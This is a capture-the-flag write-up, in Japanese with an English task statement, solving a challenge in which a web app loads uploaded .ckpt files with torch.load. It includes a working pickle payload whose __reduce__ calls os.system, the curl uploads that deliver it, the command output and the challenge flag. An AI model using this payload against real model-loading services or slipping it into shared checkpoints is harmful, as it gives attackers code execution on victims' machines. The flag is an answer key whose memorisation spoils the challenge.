# machine_loading:Misc:303pts
機械学習モデルを試すことができるサイトを作っています。  
まだ未完成ですが、モデルをロードする部分は先に作成しました。  
モデルの形式は、みんなよく使っている.ckptにします！  
I'm creating a website where users can test machine learning models.  
It's not completed yet, but I've already created the part that loads a model.  
The format of the model will be .ckpt, which we all use a lot!  
[https://machine-mis.wanictf.org](https://machine-mis.wanictf.org/)  

[mis-machine-loading.zip](mis-machine-loading.zip)  

# Solution
URLとソースが与えられる(Web問か？)。  
ひとまずアクセスすると、機械学習モデルをアップロードできるようだ。  
![site.png](site/site.png)  
ソースを見ると主要個所は以下の通りであった。  
```python
import torch
~~~
@app.route("/upload", methods=["POST"])
def upload():
    file = request.files["file"]
    if not file:
        return "No file uploaded.", 422
    if file.content_length > 1024 * 1024:  # 1MB
        return "File too large. Max size is 1MB.", 400

    suffix = pathlib.Path(file.filename).suffix
    if suffix == ".ckpt":
        try:
            modelload(file)

            if os.path.exists("output_dir/output.txt"):
                with open("output_dir/output.txt", "r") as f:
                    msg = f.read()
                os.remove("output_dir/output.txt")

            return f"File loaded successfully: {msg}"
        except Exception as e:
            return "ERROR: " + str(e), 400
    else:
        return "Invalid file extension. Only .ckpt allowed.", 400


def modelload(file):
    with BytesIO(file.read()) as f:
        try:
            torch.load(f)
            return
        except Exception as e:
            raise e
~~~
```
送信されたckptファイルを`torch.load`で読み取っている。  
そして謎だが`output_dir/output.txt`を返してくれる。  
ここで、ckptについて調べると、どうやら内部でpickleが利用されているようだ。  
よくあるRCEを行って、`output_dir/output.txt`経由で結果を取得する問題だと予想できる。  
以下のid_ckpt.pyを用いて、攻撃に用いるckptを作成する。  
```python
import os
import torch

class Exploit:
    def __reduce__(self):
        cmd = ("id > output_dir/output.txt")
        return os.system, (cmd,)

model = Exploit()

torch.save(model, "id.ckpt")
```
実行してできたid.ckptをアップロードする。  
```bash
$ python id_ckpt.py
$ curl -X POST https://machine-mis.wanictf.org/upload -F file=@id.ckpt
File loaded successfully: uid=1000(ctf_user) gid=1000(ctf_user) groups=1000(ctf_user)
```
任意のコードが実行できた。  
あとは同様にコマンド部分を変えてフラグを見つければよい。  
```bash
$ python ls_ckpt.py
$ curl -X POST https://machine-mis.wanictf.org/upload -F file=@ls.ckpt
File loaded successfully: chall.py
flag.txt
output_dir
templates
$ python cat_flag.txt_ckpt.py
$ curl -X POST https://machine-mis.wanictf.org/upload -F file=@cat_flag.txt.ckpt
File loaded successfully: FLAG{Use_0ther_extens10n_such_as_safetensors}
```
flag.txtがあり、中にflagが書かれていた。  

## FLAG{Use_0ther_extens10n_such_as_safetensors}